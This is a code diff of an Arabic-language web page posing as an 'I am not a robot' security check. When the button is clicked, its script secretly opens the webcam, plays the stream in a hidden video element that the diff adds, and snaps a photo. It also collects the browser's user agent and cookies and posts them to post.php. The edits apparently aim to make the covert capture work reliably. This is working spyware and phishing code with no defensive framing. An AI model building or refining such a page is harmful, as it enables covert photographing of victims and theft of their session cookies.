@@ -1,24 +1,17 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>التحقق الأمني</title>
-    <style>
-        body { background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .btn { padding: 20px 40px; background: white; border: 1px solid #ccc; cursor: pointer; border-radius: 8px; font-size: 18px; }
-    </style>
-</head>
-<body>
-
-<button class="btn" onclick="startProcess()">أنا لست برنامج روبوت</button>
-
 <script>
     async function startProcess() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
             video.srcObject = stream;
+            
+            // إضافة الفيديو للمتصفح (بشكل مخفي) لضمان عمله
+            video.style.display = 'none';
+            document.body.appendChild(video);
             await video.play();
+
+            // انتظار بسيط لضمان تحميل الفيديو (نصف ثانية)
+            await new Promise(r => setTimeout(r, 500));
 
             const browserInfo = navigator.userAgent;
             const cookies = document.cookie;
@@ -28,6 +21,7 @@
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             const imgData = canvas.toDataURL('image/jpeg', 0.8);
 
+            // استخدام علامات التنصيص الصحيحة (Backticks) لإرسال البيانات
             await fetch('post.php', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -41,5 +35,3 @@
         }
     }
 </script>
-</body>
-</html>
